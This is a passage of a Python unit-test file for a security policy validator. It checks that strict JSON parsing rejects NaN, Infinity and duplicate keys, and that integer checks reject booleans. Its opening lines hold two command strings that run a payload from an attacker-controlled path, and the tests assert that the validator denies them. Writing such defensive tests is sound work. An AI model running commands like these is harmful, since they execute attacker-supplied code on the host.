        self.assert_denied('& "$env:ATTACKER\\payload.ps1"\n', "DYNAMIC_EXECUTION")
        self.assert_denied('python -B "$env:ATTACKER"\n', "DYNAMIC_EXECUTION")


class StrictJsonTests(PolicyTestCase):
    def test_non_json_constants_are_rejected(self):
        for text in (
            '{"a": NaN}',
            '{"a": Infinity}',
            '{"a": -Infinity}',
            '[NaN]',
            '{"a": {"b": [1, Infinity]}}',
        ):
            with self.subTest(text=text):
                self.assert_policy_error(
                    "JSON_CONSTANT", lambda text=text: parse_json_strict(text)
                )

    def test_duplicate_keys_still_reject(self):
        self.assert_policy_error(
            "JSON_DUPLICATE_KEY", lambda: parse_json_strict('{"a": 1, "a": 2}')
        )

    def test_ordinary_json_still_parses(self):
        self.assertEqual(parse_json_strict('{"a": [1, true, null]}'), {"a": [1, True, None]})


class ExactIntegerTests(PolicyTestCase):
    def test_bool_is_never_an_integer_id(self):
        for value in (True, False):
            with self.subTest(value=value):
                self.assertFalse(is_exact_int(value))
                self.assertFalse(is_positive_id(value))
                self.assertFalse(is_nonnegative_size(value))

    def test_real_integers_are_accepted(self):
        self.assertTrue(is_exact_int(0))
        self.assertTrue(is_positive_id(1))
        self.assertTrue(is_nonnegative_size(0))
        self.assertFalse(is_positive_id(0))
        self.assertFalse(is_nonnegative_size(-1))

    def test_floats_and_strings_are_not_integers(self):
        for value in (1.0, "1", None, [1]):
            with self.subTest(value=value):
                self.assertFalse(is_exact_int(value))

    def test_graph_repository_id_rejects_bool(self):
        graph = copy.deepcopy(self.graph_snapshot())
        graph["repository"]["id"] = True
        self.assert_policy_error(
            "GRAPH_REPOSITORY", lambda: validate_approval_graph(graph)
        )

    def graph_snapshot(self):
        return json.loads(
            (POLICY_DIR / "approval-graph.json").read_text(encoding="utf-8")
        )


if __name__ == "__main__":
    unittest.main()
